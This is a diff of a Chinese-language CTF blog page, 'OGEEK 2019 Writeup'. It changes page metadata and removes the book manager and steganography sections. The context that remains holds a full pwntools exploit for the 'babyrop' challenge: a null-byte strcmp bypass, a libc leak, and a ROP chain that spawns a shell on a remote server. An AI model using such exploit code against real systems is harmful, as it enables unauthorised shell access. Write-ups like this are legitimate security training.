@@ -14,7 +14,7 @@
 <meta property="og:site_name" content="1nv0k3r&#39;s blog">
 <meta property="og:description" content="签到flag{Reno} babyrop输入一个字符串和一个随机串通过strcmp比较, 如果比较成功可以到达漏洞点进行栈溢出 可以通过在输入串开头加&amp;#39;\x00&amp;#39;来绕过, 然后栈溢出leak libc基地址, 之后利用ropgadget搞个ropchain即可getshell from pwn import *from struct import pack# r = process">
 <meta property="og:locale" content="en">
-<meta property="og:updated_time" content="2020-04-16T08:08:41.783Z">
+<meta property="og:updated_time" content="2020-05-18T12:19:11.399Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="OGEEK 2019 Writeup">
 <meta name="twitter:description" content="签到flag{Reno} babyrop输入一个字符串和一个随机串通过strcmp比较, 如果比较成功可以到达漏洞点进行栈溢出 可以通过在输入串开头加&amp;#39;\x00&amp;#39;来绕过, 然后栈溢出leak libc基地址, 之后利用ropgadget搞个ropchain即可getshell from pwn import *from struct import pack# r = process">
@@ -73,7 +73,7 @@
     <span id="actions">
       <ul>
         
-        <li><a class="icon" href="/2019/08/26/CVE-2019-12527-squid-rce-分析/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        <li><a class="icon" href="/2019/09/06/CVE-2019-15846-分析/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
         
         
         <li><a class="icon" href="/2019/06/06/修改ELF文件的NX保护/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
@@ -103,7 +103,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#book-manager"><span class="toc-number">3.</span> <span class="toc-text">book manager</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019"><span class="toc-number">4.</span> <span class="toc-text">2019</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -147,53 +147,6 @@
 <p>可以通过在输入串开头加<code>&#39;\x00&#39;</code>来绕过, 然后栈溢出leak libc基地址, 之后利用ropgadget搞个ropchain即可getshell</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="comment"># r = process('./babyrop')</span></span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">r = remote(<span class="string">'47.112.137.238'</span>, <span class="number">13337</span>)</span><br><span class="line">r.sendline(<span class="string">'\x00'</span> + <span class="string">'\xff'</span> * <span class="number">0x10</span>)</span><br><span class="line">r.recv() <span class="comment"># Corret!</span></span><br><span class="line"><span class="comment"># leak libc base</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">puts_plt_addr = <span class="number">0x08048548</span></span><br><span class="line">puts_got_addr = <span class="number">0x08049FD4</span></span><br><span class="line">ret_addr = <span class="number">0x08048825</span></span><br><span class="line">r.send(<span class="string">'a'</span>*<span class="number">0xeb</span> + p32(puts_plt_addr) + p32(ret_addr) + p32(puts_got_addr))</span><br><span class="line">libc_base = u32(r.recv()) - ELF(<span class="string">'libc-2.23.so'</span>).symbols[<span class="string">'puts'</span>]</span><br><span class="line"></span><br><span class="line">r.sendline(<span class="string">'\x00'</span> + <span class="string">'\xff'</span> * <span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding goes here</span></span><br><span class="line">p = <span class="string">''</span></span><br><span class="line"></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00001aa6</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0040</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00023f97</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'/bin'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x0006b34b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00001aa6</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0044</span>) <span class="comment"># @ .data + 4</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00023f97</span>) <span class="comment"># pop eax ; ret</span></span><br><span class="line">p += <span class="string">'//sh'</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x0006b34b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00001aa6</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0048</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x0002c5fc</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x0006b34b</span>) <span class="comment"># mov dword ptr [edx], eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00018395</span>) <span class="comment"># pop ebx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0040</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x000b4047</span>) <span class="comment"># pop ecx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0048</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00001aa6</span>) <span class="comment"># pop edx ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x001b0048</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x0002c5fc</span>) <span class="comment"># xor eax, eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00007eec</span>) <span class="comment"># inc eax ; ret</span></span><br><span class="line">p += pack(<span class="string">'&lt;I'</span>, libc_base + <span class="number">0x00002c87</span>) <span class="comment"># int 0x80</span></span><br><span class="line"></span><br><span class="line">r.send(<span class="string">'a'</span> * <span class="number">0xeb</span> + p)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
 <p>flag{BXCTFKKAZ8!bw&amp;kN}</p>
-<h2 id="book-manager"><a href="#book-manager" class="headerlink" title="book manager"></a>book manager</h2><p>提供一个图书编辑功能, 首先输入图书名, 之后是以下功能</p>
-<ul>
-<li>添加chapter</li>
-<li>添加section</li>
-<li>添加text</li>
-<li>删除chapter</li>
-<li>删除section</li>
-<li>删除text</li>
-<li>书籍预览</li>
-<li>修改(章节/小节/文本)</li>
-</ul>
-<p>程序启动后先malloc一个0x80的chunk, 然后清空前0x1E个字节</p>
-<p>输入0x1e个字节的name, 复制到这个chunk前面, 有截断</p>
-<ul>
-<li>添加chapter</li>
-</ul>
-<p>最多可以创建12个chapter, 从第32个字节开始判断, 满足12个以内就可以用来存放一个0x8的指针, 这个指针指向一个新创建的0x80的chunk, 前0x20字节用来存放chapter name</p>
-<ul>
-<li>添加section</li>
-</ul>
-<p>最多创建10个section, 先判断输入的chapter name是否存在, 如果存在就在chapter的第32个字节处开始存放0x30的chunk的指针, 输出这个指针指向的地址, 之后输入一个section name, 存放在前32字节, 并在40字节处存放数字32</p>
-<ul>
-<li>添加text</li>
-</ul>
-<p>输入一个section name, 遍历所有chapter来查找, 找到后, 在其第32字节处创建一个小于256的chunk, 然后存入输入内容</p>
-<ul>
-<li>删除chapter</li>
-</ul>
-<p>输入chapter name, 找到后, 按照text-&gt;section-&gt;chapter的顺序来free, 然后置零</p>
-<ul>
-<li>删除section</li>
-</ul>
-<p>输入section name, 先free text, 然后free section, 但是section指针未置零, 存在uaf</p>
-<ul>
-<li>删除text</li>
-</ul>
-<p>输入section name, 只free text并置零</p>
-<ul>
-<li>预览</li>
-</ul>
-<p>按顺序输出每个chapter和其section以及text</p>
-<ul>
-<li>修改</li>
-</ul>
-<p>先输入要修改chapter/section/text, 然后输入各种name</p>
-<h2 id="2019"><a href="#2019" class="headerlink" title="2019"></a>2019</h2><p>PNG低位隐写, 提取出来base64串<code>QW8obWdIW11XTyxyOFVTM0dNMlIySSVZQjdzdA==</code></p>
-<p>解得<code>Ao(mgH[]WO,r8US3GM2R2I%YB7st</code></p>
 
   </div>
 </article>
@@ -225,7 +178,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#book-manager"><span class="toc-number">3.</span> <span class="toc-text">book manager</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2019"><span class="toc-number">4.</span> <span class="toc-text">2019</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#签到"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#babyrop"><span class="toc-number">2.</span> <span class="toc-text">babyrop</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
